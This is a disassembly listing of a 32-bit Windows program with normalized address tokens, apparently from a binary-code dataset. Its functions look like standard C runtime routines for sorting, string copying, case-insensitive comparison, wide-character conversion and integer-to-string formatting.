mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
cmp ebx ecx
jbe r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x10 ]
push esi
push edi
lea edx [ ecx + eax ]
mov esi eax
mov edx ebx
cmp edi ebx
je r-xdata
jmp r-xdata
sub ebx eax
lea edx [ ecx + eax ]
cmp ebx ecx
ja r-xdata
test eax eax
je r-xdata
mov ecx [ ebp + 0x14 ]
push edi
push esi
call [ r--data ]
call [ ebp + 0x14 ]
add esp 0x8
test eax eax
jle r-xdata
mov esi edx
mov edi ecx
cmp esi ebx
ja r-xdata
pop edi
pop esi
sub edi ebx
mov eax [ ebp + 0x10 ]
add esi eax
cmp esi ebx
jbe r-xdata
mov edi esi
mov al [ edx ]
lea edx [ edx + 0x1 ]
mov cl [ edi + edx - 0x1 ]
mov [ edi + edx - 0x1 ] al
mov [ edx - 0x1 ] cl
sub esi 0x1
jne r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
sub_443850
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
cmp edi eax
je r-xdata
pop edi
pop ebp
retn
push esi
mov esi [ ebp + 0x10 ]
test esi esi
je r-xdata
pop esi
sub edi eax
lea ebx [ ebx ]
mov cl [ eax ]
lea eax [ eax + 0x1 ]
mov dl [ edi + eax - 0x1 ]
mov [ edi + eax - 0x1 ] cl
mov [ eax - 0x1 ] dl
sub esi 0x1
jne r-xdata
sub_443890
mov edi edi
push ebp
mov ebp esp
sub esp 0x11c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ebp - 0x104 ] ecx
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x100 ] esi
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0xfc ] edi
test ecx ecx
jne r-xdata
test edi edi
je r-xdata
test edx edx
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn
test esi esi
je r-xdata
mov [ ebp - 0x108 ] 0x0
cmp edx 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn
dec edx
imul edx edi
push ebx
add edx ecx
shr ebx 0x1
imul ebx edi
add ebx ecx
push ebx
push ecx
mov ecx esi
mov [ ebp - 0x110 ] ebx
call [ r--data ]
call esi
add esp 0x8
test eax eax
jle r-xdata
push esi
push edi
push [ ebp - 0xf8 ]
push ecx
call sub_4437b0
add esp 0x10
jmp r-xdata
push [ ebp - 0xf8 ]
mov ecx esi
push [ ebp - 0x104 ]
call [ r--data ]
call esi
add esp 0x8
test eax eax
jle r-xdata
push edi
push ebx
push [ ebp - 0x104 ]
call sub_443850
add esp 0xc
mov eax [ ebp - 0x108 ]
sub eax 0x1
mov [ ebp - 0x108 ] eax
js r-xdata
push [ ebp - 0xf8 ]
mov ecx esi
push ebx
call [ r--data ]
call esi
add esp 0x8
test eax eax
jle r-xdata
push edi
push [ ebp - 0xf8 ]
push [ ebp - 0x104 ]
call sub_443850
add esp 0xc
pop ebx
mov ecx [ ebp + eax * 4 - 0xf4 ]
mov edx [ ebp + eax * 4 - 0x7c ]
mov [ ebp - 0x104 ] ecx
jmp r-xdata
mov eax [ ebp - 0xf8 ]
mov edi eax
mov esi [ ebp - 0x104 ]
mov edx [ ebp - 0xfc ]
mov [ ebp - 0x114 ] eax
nop
push edi
push [ ebp - 0xf8 ]
push ebx
call sub_443850
add esp 0xc
mov [ ebp - 0xf8 ] edx
mov edi [ ebp - 0x100 ]
add esi edx
mov [ ebp - 0x10c ] esi
cmp esi ebx
jae r-xdata
mov edi [ ebp - 0x114 ]
mov [ ebp - 0x10c ] esi
push ebx
push esi
mov ecx edi
call [ r--data ]
call edi
mov edx [ ebp - 0xfc ]
add esp 0x8
test eax eax
mov eax [ ebp - 0xf8 ]
jle r-xdata
mov eax [ ebp - 0xf8 ]
mov ecx [ ebp - 0x100 ]
push ebx
push esi
call [ r--data ]
call [ ebp - 0x100 ]
mov edx [ ebp - 0xfc ]
add esp 0x8
test eax eax
jle r-xdata
mov edx [ ebp - 0xfc ]
sub edi edx
cmp edi ebx
jbe r-xdata
add esi edx
cmp esi eax
ja r-xdata
cmp ebx esi
ja r-xdata
mov esi [ ebp - 0x10c ]
mov [ ebp - 0x114 ] edi
cmp edi esi
jb r-xdata
push ebx
push edi
mov ecx esi
call [ r--data ]
call esi
add esp 0x8
test eax eax
jg r-xdata
mov esi [ ebp - 0x100 ]
jmp r-xdata
add edi edx
cmp ebx edi
jae r-xdata
mov [ ebp - 0x118 ] edx
mov [ ebp - 0x11c ] edi
cmp esi edi
je r-xdata
mov edx [ ebp - 0xfc ]
mov esi [ ebp - 0x100 ]
lea esp [ esp ]
mov eax [ ebp - 0xf8 ]
cmp ebx edi
jne r-xdata
mov ebx esi
mov edx edi
mov esi [ ebp - 0x118 ]
sub ebx edi
mov esi [ ebp - 0x10c ]
push ebx
push edi
mov ecx esi
call [ r--data ]
call esi
mov edx [ ebp - 0xfc ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0x100 ]
push ebx
push edi
call [ r--data ]
call [ ebp - 0x100 ]
mov edx [ ebp - 0xfc ]
add esp 0x8
test eax eax
je r-xdata
cmp ebx esi
jbe r-xdata
mov ebx esi
mov [ ebp - 0x110 ] ebx
jmp r-xdata
mov al [ edx ]
lea edx [ edx + 0x1 ]
mov cl [ ebx + edx - 0x1 ]
mov [ ebx + edx - 0x1 ] al
mov [ edx - 0x1 ] cl
sub esi 0x1
jne r-xdata
mov esi [ ebp - 0x10c ]
mov ebx [ ebp - 0x110 ]
mov edx [ ebp - 0xfc ]
cmp esi edx
jae r-xdata
cmp ebx edi
jae r-xdata
sub edi edx
cmp edi [ ebp - 0x104 ]
jbe r-xdata
sub edi edx
cmp edi ebx
jbe r-xdata
cmp ebx edi
jb r-xdata
mov ecx [ ebp - 0x104 ]
mov esi [ ebp - 0x100 ]
cmp ecx edi
jae r-xdata
mov eax [ ebp - 0x108 ]
mov [ ebp + eax * 4 - 0xf4 ] esi
mov [ ebp + eax * 4 - 0x7c ] edx
inc eax
mov [ ebp - 0x108 ] eax
mov edi [ ebp - 0xfc ]
cmp esi edx
jae r-xdata
mov eax [ ebp - 0x108 ]
mov [ ebp + eax * 4 - 0xf4 ] ebx
mov [ ebp + eax * 4 - 0x7c ] edi
inc eax
mov [ ebp - 0x108 ] eax
mov edx [ ebp - 0xf8 ]
mov eax edi
mov ebx [ ebp - 0x104 ]
mov ecx edx
sub ecx esi
sub eax ebx
cmp eax ecx
jl r-xdata
mov edi [ ebp - 0xfc ]
mov edx edi
mov edi [ ebp - 0xfc ]
jmp r-xdata
mov esi [ ebp - 0x100 ]
jmp r-xdata
mov ecx esi
mov esi [ ebp - 0x100 ]
mov [ ebp - 0x104 ] ecx
jmp r-xdata
mov eax edx
xor edx edx
sub eax ecx
div edi
lea ebx [ eax + 0x1 ]
cmp ebx 0x8
ja r-xdata
sub_443c2a
mov edi edi
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0x8 ]
push esi
test edx edx
jne r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
call sub_430f56
push 0x16
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
cmp [ ebp + 0xc ] ecx
jne r-xdata
test edx edx
jne r-xdata
xor eax eax
jmp r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
mov [ ecx ] dl
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
push ebx
sub esi ecx
mov ebx eax
push edi
mov edi ecx
cmp edx 0xffffffff
jne r-xdata
mov [ ecx ] 0x0
mov al [ esi + edi ]
mov [ edi ] al
inc edi
test al al
je r-xdata
mov al [ esi + edi ]
mov [ edi ] al
inc edi
test al al
je r-xdata
test edx edx
mov edx [ ebp + 0x14 ]
jne r-xdata
sub ebx 0x1
je r-xdata
pop edi
test ebx ebx
pop ebx
jne r-xdata
sub ebx 0x1
jne r-xdata
mov [ edi ] 0x0
sub edx 0x1
jne r-xdata
cmp edx 0xffffffff
jne r-xdata
jmp r-xdata
mov [ ecx ] 0x0
call sub_430f56
push 0x22
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x50
mov [ ecx + eax - 0x1 ] 0x0
pop eax
jmp r-xdata
pop esi
mov [ eax ] esi
call sub_430e30
mov eax esi
sub_443cf0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_443d47
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] esi
jb r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
jmp r-xdata
mov esp ebp
pop ebp
retn
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_41cbf0
mov edx [ ebp - 0x8 ]
cmp [ edx + 0x8 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
dec esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea ecx [ esi - 0x1 ]
pop esi
mov eax esi
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
mov eax esi
sub eax ecx
and eax 0x1
sub esi eax
movzx eax [ ecx ]
test [ eax + edx + 0x19 ] 0x4
jne r-xdata
dec ecx
cmp [ ebp + 0x8 ] ecx
ja r-xdata
sub_443de3
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
push esi
push edi
test eax eax
jne r-xdata
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_443eb3
add esp 0x10
mov edx [ ebp + 0x8 ]
test edx edx
jne r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
mov eax 0x7fffffff
jmp r-xdata
mov edi [ ebp + 0x10 ]
mov esi 0x7fffffff
cmp edi esi
jbe r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
push ebx
push 0x41
pop ebx
push 0x5a
pop esi
sub edx ecx
mov [ ebp - 0x4 ] esi
jmp r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
mov eax esi
jmp r-xdata
movzx eax [ edx + ecx ]
cmp ax bx
jb r-xdata
mov esi eax
cmp ax si
ja r-xdata
add ecx 0x2
sub edi 0x1
je r-xdata
cmp ax [ ebp - 0x4 ]
ja r-xdata
add eax 0x20
movzx esi ax
jmp r-xdata
movzx ecx ax
movzx eax si
sub eax ecx
pop ebx
jmp r-xdata
test si si
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp ax bx
jb r-xdata
cmp si ax
je r-xdata
push 0x5a
pop esi
sub_443eb3
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
mov eax 0x7fffffff
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov esi 0x7fffffff
cmp ebx esi
jbe r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
mov eax 0x7fffffff
jmp r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_41cbf0
mov eax [ ebp - 0xc ]
mov eax [ eax + 0xa4 ]
test eax eax
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
jmp r-xdata
pop edi
push ebx
push edi
push ebx
push [ ebp + 0x8 ]
push 0x1001
push eax
call sub_446b8c
add esp 0x18
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
sub eax edi
push 0x41
mov [ ebp + 0x8 ] eax
pop esi
mov eax esi
pop esi
lea esi [ eax - 0x2 ]
call sub_430f56
mov [ eax ] 0x16
jmp r-xdata
mov ecx eax
cmp ax dx
ja r-xdata
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx eax
cmp ax dx
ja r-xdata
add eax 0x20
movzx ecx ax
jmp r-xdata
movzx eax dx
movzx esi cx
sub esi eax
jmp r-xdata
test cx cx
je r-xdata
add eax 0x20
movzx edx ax
jmp r-xdata
movzx eax [ edi ]
cmp ax si
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp cx dx
je r-xdata
add edi 0x2
sub ebx 0x1
je r-xdata
movzx eax [ eax + edi ]
push 0x5a
pop edx
cmp ax si
jb r-xdata
sub_443fe0
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
jne r-xdata
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_444009
add esp 0x10
pop ebp
retn
pop ebp
jmp sub_43d9f8
sub_444009
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push ebx
push esi
push edi
push [ ebp + 0x14 ]
call sub_41cbf0
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
xor esi esi
jmp r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
mov esi 0x7fffffff
jmp r-xdata
mov edx [ ebp + 0xc ]
test edx edx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esi 0x7fffffff
cmp eax esi
jbe r-xdata
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
mov edi [ ebp - 0xc ]
mov ebx [ edi + 0xa4 ]
test ebx ebx
jne r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
jmp r-xdata
push [ edi + 0x10 ]
push eax
push edx
push eax
push ecx
push 0x1001
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_446e9c
add esp 0x20
test eax eax
jne r-xdata
lea esi [ ebp - 0xc ]
push esi
push eax
push edx
push ecx
call sub_43da64
add esp 0x10
mov esi eax
jmp r-xdata
lea esi [ eax - 0x2 ]
call sub_430f56
mov [ eax ] 0x16
jmp r-xdata
sub_4440d3
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x18 ]
call sub_41cbf0
mov eax [ ebp - 0x14 ]
xor edi edi
push edi
push edi
push [ ebp + 0x10 ]
mov eax [ eax + 0x8 ]
push [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
call sub_42fb9a
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
lea edx [ ebx + ebx ]
lea ecx [ edx + 0x8 ]
cmp edx ecx
sbb eax eax
test ecx eax
je r-xdata
mov eax edi
lea esp [ ebp - 0x24 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x18 ]
and [ eax + 0x350 ] 0xfffffffd
mov esi edi
lea ecx [ edx + 0x8 ]
cmp edx ecx
sbb eax eax
and eax ecx
lea ecx [ edx + 0x8 ]
cmp eax 0x400
ja r-xdata
push esi
call sub_43a5a0
pop ecx
push ebx
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_42fb9a
test eax eax
je r-xdata
cmp edx ecx
sbb eax eax
and eax ecx
push eax
call sub_42d3eb
mov esi eax
pop ecx
test esi esi
je r-xdata
cmp edx ecx
sbb eax eax
and eax ecx
call sub_448dc0
mov esi esp
test esi esi
je r-xdata
mov eax [ ebp + 0x18 ]
push edi
push edi
push eax
neg eax
sbb eax eax
and eax [ ebp + 0x14 ]
push eax
push 0xffffffff
push esi
push edi
push [ ebp - 0x8 ]
call [ WideCharToMultiByte@IAT ]
mov edi eax
mov [ esi ] 0xdddd
mov [ esi ] 0xcccc
jmp r-xdata
test esi esi
je r-xdata
add esi 0x8
jmp r-xdata
sub_4441ce
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x18 ]
push esi
mov esi [ ebp + 0x10 ]
push edi
xor edi edi
mov [ ebp - 0x90 ] ecx
mov [ ebp - 0x88 ] esi
mov [ ebx ] edi
cmp eax 0x1
jne r-xdata
cmp eax 0x2
jne r-xdata
push 0x80
lea eax [ ebp - 0x84 ]
push eax
push [ ebp + 0x14 ]
push esi
push ecx
call sub_4440d3
add esp 0x14
mov [ ebp - 0x8c ] eax
test eax eax
je r-xdata
test eax eax
jne r-xdata
push edi
push edi
push [ ebp + 0x14 ]
push esi
call sub_42fb9a
mov [ ebp - 0x8c ] eax
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
push 0x1
push eax
call sub_42d49d
push edi
mov [ ebx ] eax
call sub_42d3b1
add esp 0xc
cmp [ ebx ] edi
je r-xdata
or eax 0xffffffff
push 0x2
lea eax [ ebp - 0x88 ]
mov [ ebp - 0x88 ] edi
push eax
mov eax [ ebp + 0x14 ]
or eax 0x20000000
push eax
push esi
call sub_42fb9a
test eax eax
je r-xdata
push 0x2
push eax
call sub_42d49d
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push edi
push edi
push [ ebp + 0x14 ]
push esi
push [ ebp - 0x90 ]
call sub_4440d3
add esp 0x14
mov [ ebp - 0x8c ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x8c ]
lea eax [ ecx - 0x1 ]
push eax
lea eax [ ebp - 0x84 ]
push eax
push ecx
push [ ebx ]
call sub_443cdb
add esp 0x10
test eax eax
jne r-xdata
mov al [ ebp - 0x88 ]
mov [ ebx ] al
jmp r-xdata
or edi 0xffffffff
push [ ebp - 0x8c ]
push esi
push [ ebp + 0x14 ]
push [ ebp - 0x88 ]
call sub_42fb9a
jmp r-xdata
push 0x1
push eax
call sub_42d49d
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_430e5d
int3
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
test eax eax
je r-xdata
push [ ebp - 0x8c ]
push esi
push [ ebp + 0x14 ]
push [ ebp - 0x88 ]
push [ ebp - 0x90 ]
call sub_4440d3
add esp 0x14
mov eax esi
mov esi edi
mov [ ebx ] eax
jmp r-xdata
push esi
call sub_42d3b1
pop ecx
mov eax edi
jmp r-xdata
sub_444380
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi ebx
push edi
cmp [ ebp + 0x18 ] cl
je r-xdata
mov edi esi
inc ecx
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
neg eax
add dl 0x30
add dl 0x57
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jb r-xdata
mov [ esi ] dl
inc esi
inc ecx
test eax eax
je r-xdata
mov [ esi ] 0x0
dec esi
mov [ ebx ] 0x0
call sub_430f56
push 0x22
pop esi
mov [ eax ] esi
call sub_430e30
mov eax esi
jmp r-xdata
xor edx edx
div [ ebp + 0x14 ]
cmp edx 0x9
jbe r-xdata
mov al [ edi ]
mov cl [ esi ]
mov [ esi ] al
dec esi
mov [ edi ] cl
inc edi
cmp edi esi
jb r-xdata
xor eax eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4443f5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push ebx
push esi
xor ebx ebx
mov esi eax
push edi
cmp [ ebp + 0x18 ] bl
je r-xdata
mov edi esi
push 0x2d
pop edx
inc ebx
mov [ eax ] dx
lea esi [ eax + 0x2 ]
neg ecx
mov [ esi ] ax
add esi 0x2
inc ebx
test ecx ecx
je r-xdata
lea eax [ edx + 0x30 ]
cmp ebx [ ebp + 0x10 ]
jb r-xdata
cmp ebx [ ebp + 0x10 ]
jb r-xdata
xor eax eax
mov [ esi ] ax
sub esi 0x2
mov eax [ ebp + 0xc ]
xor ecx ecx
mov [ eax ] cx
call sub_430f56
push 0x22
pop esi
mov [ eax ] esi
call sub_430e30
mov eax esi
jmp r-xdata
mov eax ecx
xor edx edx
div [ ebp + 0x14 ]
mov ecx eax
lea eax [ edx + 0x57 ]
cmp edx 0x9
ja r-xdata
mov ax [ edi ]
movzx ecx [ esi ]
mov [ esi ] ax
sub esi 0x2
mov [ edi ] cx
add edi 0x2
cmp edi esi
jb r-xdata
xor eax eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_444483
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x10 ]
xor eax eax
mov edx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ ebp - 0x4 ] eax
push edi
cmp [ ebp + 0x1c ] al
je r-xdata
mov edi [ ebp - 0x4 ]
mov [ ebp - 0xc ] esi
inc eax
mov [ ecx ] 0x2d
neg ebx
mov [ ebp - 0x4 ] eax
lea esi [ ecx + 0x1 ]
adc edx 0x0
neg edx
add cl 0x30
add cl 0x57
jmp r-xdata
cmp edi [ ebp + 0x14 ]
jb r-xdata
test ebx ebx
je r-xdata
mov [ esi ] cl
inc esi
inc edi
test edx edx
jne r-xdata
push 0x0
push [ ebp + 0x18 ]
push edx
push ebx
call sub_448b80
mov [ ebp - 0x4 ] ebx
mov ebx eax
cmp ecx 0x9
jbe r-xdata
cmp edi [ ebp + 0x14 ]
mov edi [ ebp - 0xc ]
jb r-xdata
mov [ esi ] 0x0
dec esi
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
call sub_430f56
push 0x22
pop esi
mov [ eax ] esi
call sub_430e30
mov eax esi
jmp r-xdata
mov al [ edi ]
mov cl [ esi ]
mov [ esi ] al
dec esi
mov [ edi ] cl
inc edi
cmp edi esi
jb r-xdata
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_444525
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
xor eax eax
mov edx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi ebx
mov [ ebp - 0x4 ] eax
push edi
cmp [ ebp + 0x1c ] al
je r-xdata
mov edi [ ebp - 0x4 ]
mov [ ebp - 0x8 ] esi
push 0x2d
pop eax
mov [ ebx ] ax
lea esi [ ebx + 0x2 ]
xor eax eax
inc eax
neg ecx
mov [ ebp - 0x4 ] eax
adc edx 0x0
neg edx
add eax 0x30
add eax 0x57
jmp r-xdata
cmp edi [ ebp + 0x14 ]
jb r-xdata
test ecx ecx
je r-xdata
mov [ esi ] ax
add esi 0x2
inc edi
test edx edx
jne r-xdata
push 0x0
push [ ebp + 0x18 ]
push edx
push ecx
call sub_448b80
mov [ ebp - 0x4 ] ecx
mov ecx eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] ebx
cmp eax 0x9
jbe r-xdata
cmp edi [ ebp + 0x14 ]
mov edi [ ebp - 0x8 ]
jb r-xdata
xor eax eax
mov [ esi ] ax
sub esi 0x2
mov eax [ ebp + 0x10 ]
xor ecx ecx
mov [ eax ] cx
call sub_430f56
push 0x22
pop esi
mov [ eax ] esi
call sub_430e30
mov eax esi
jmp r-xdata
mov ax [ edi ]
movzx ecx [ esi ]
mov [ esi ] ax
sub esi 0x2
mov [ edi ] cx
add edi 0x2
cmp edi esi
jb r-xdata
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4445e3
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push esi
test ecx ecx
jne r-xdata
mov edx [ ebp + 0x10 ]
test edx edx
je r-xdata
call sub_430f56
push 0x16
xor eax eax
mov [ ecx ] 0x0
cmp [ ebp + 0x18 ] al
setne al
inc eax
cmp edx eax
ja r-xdata
pop esi
pop ebp
retn
mov esi [ ebp + 0x14 ]
lea eax [ esi - 0x2 ]
cmp eax 0x22
ja r-xdata
call sub_430f56
push 0x22
jmp r-xdata
push [ ebp + 0x18 ]
push esi
push edx
push ecx
push [ ebp + 0x8 ]
call sub_444380
add esp 0x14
pop esi
mov [ eax ] esi
call sub_430e30
mov eax esi
jmp r-xdata
sub_444642
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push esi
test ecx ecx
jne r-xdata
mov edx [ ebp + 0x10 ]
test edx edx
je r-xdata
call sub_430f56
push 0x16
xor eax eax
cmp [ ebp + 0x18 ] al
mov [ ecx ] ax
setne al
inc eax
cmp edx eax
ja r-xdata
pop esi
pop ebp
retn
mov esi [ ebp + 0x14 ]
lea eax [ esi - 0x2 ]
cmp eax 0x22
ja r-xdata
call sub_430f56
push 0x22
jmp r-xdata
push [ ebp + 0x18 ]
push esi
push edx
push ecx
push [ ebp + 0x8 ]
call sub_4443f5
add esp 0x14
pop esi
mov [ eax ] esi
call sub_430e30
mov eax esi
jmp r-xdata
sub_4446a1
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
push esi
test ecx ecx
jne r-xdata
mov edx [ ebp + 0x14 ]
test edx edx
je r-xdata
call sub_430f56
push 0x16
xor eax eax
mov [ ecx ] 0x0
cmp [ ebp + 0x1c ] al
setne al
inc eax
cmp edx eax
ja r-xdata
pop esi
pop ebp
retn
mov esi [ ebp + 0x18 ]
lea eax [ esi - 0x2 ]
cmp eax 0x22
ja r-xdata
call sub_430f56
push 0x22
jmp r-xdata
push [ ebp + 0x1c ]
push esi
push edx
push ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_444483
add esp 0x18
pop esi
mov [ eax ] esi
call sub_430e30
mov eax esi
jmp r-xdata
sub_444703
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
push esi
test ecx ecx
jne r-xdata
mov edx [ ebp + 0x14 ]
test edx edx
je r-xdata
call sub_430f56
push 0x16
xor eax eax
cmp [ ebp + 0x1c ] al
mov [ ecx ] ax
setne al
inc eax
cmp edx eax
ja r-xdata
pop esi
pop ebp
retn
mov esi [ ebp + 0x18 ]
lea eax [ esi - 0x2 ]
cmp eax 0x22
ja r-xdata
call sub_430f56
push 0x22
jmp r-xdata
push [ ebp + 0x1c ]
push esi
push edx
push ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_444525
add esp 0x18
pop esi
mov [ eax ] esi
call sub_430e30
mov eax esi
jmp r-xdata
sub_444765
mov edi edi
push ebp
mov ebp esp
push ecx
xor eax eax
cmp [ ebp + 0x14 ] 0xa
jne r-xdata
mov [ ebp - 0x4 ] al
cmp [ ebp + 0xc ] eax
jg r-xdata
jl r-xdata
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp [ ebp + 0x8 ] eax
jae r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_444483
mov eax [ ebp + 0x10 ]
add esp 0x18
mov esp ebp
pop ebp
retn
sub_4447a8
mov edi edi
push ebp
mov ebp esp
push ecx
xor eax eax
cmp [ ebp + 0x18 ] 0xa
jne r-xdata
mov [ ebp - 0x4 ] al
cmp [ ebp + 0xc ] eax
jg r-xdata
jl r-xdata
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp [ ebp + 0x8 ] eax
jae r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4446a1
add esp 0x18
mov esp ebp
pop ebp
retn
sub_4447e9
mov edi edi
push ebp
mov ebp esp
push ecx
xor eax eax
cmp [ ebp + 0x14 ] 0xa
jne r-xdata
mov [ ebp - 0x4 ] al
cmp [ ebp + 0xc ] eax
jg r-xdata
jl r-xdata
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp [ ebp + 0x8 ] eax
jae r-xdata
push [ ebp - 0x4 ]
